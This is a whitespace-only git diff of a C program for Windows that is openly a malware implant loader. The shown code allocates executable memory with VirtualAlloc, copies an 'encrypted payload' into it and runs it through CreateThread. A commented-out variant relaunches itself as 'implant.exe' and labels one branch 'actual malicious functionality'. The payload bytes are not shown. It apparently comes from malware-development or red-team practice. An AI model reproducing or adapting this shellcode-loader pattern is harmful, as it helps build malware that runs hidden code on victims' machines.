@@ -49,7 +49,7 @@ int main(int argc, char * argv[])
 	LPVOID exec_mem = NULL;
 	HANDLE th = NULL;
 	int rv;
-	
+
 	char lpFileName[200];
 	LPSTR out = NULL;
 
@@ -62,7 +62,7 @@ int main(int argc, char * argv[])
 		FreeConsole();
 		//allocate executable payload in memory
 		exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	
+
 		//copy our encrypted payload into that memory
 		RtlMoveMemory(exec_mem, payload, payload_len);
 
@@ -73,21 +73,21 @@ int main(int argc, char * argv[])
 		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
 		if(th != NULL){
 			WaitForSingleObject(th, -1);
-		
+
 		}
-	
+
 
 	}
 	return 0;
 }
-	
-/*	
+
+/*
 	DWORD dwError = ERROR_SUCCESS;
 	LPVOID exec_mem = NULL;
 	char lpFileName[200];
 	LPSTR out = NULL;
 	HANDLE th = NULL;
-	
+
 	//Check executable name
 	int rv;
 	GetModuleFileNameA(NULL, lpFileName, sizeof(lpFileName));
@@ -108,17 +108,17 @@ int main(int argc, char * argv[])
 
 			//Remove FileName
 			PathRemoveFileSpecA((LPSTR)lpFileName);
-			
+
 			//Add Correct FileName
 			strcat(lpFileName, "\\implant.exe");
-			
+
 			//Call new instance
 			WinExec((LPCSTR) lpFileName, 0);
-			
+
 			break;
 
 		case 0:											//Texas Two Step, step 2. actual malicious functionality
-		
+
 			FreeConsole();
 			//allocate executable payload in memory
 			exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -129,8 +129,8 @@ int main(int argc, char * argv[])
 			//create thread with our payload running
 			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
 			WaitForSingleObject(th, -1);
-			
-			
+
+
 			break;
 
 	}
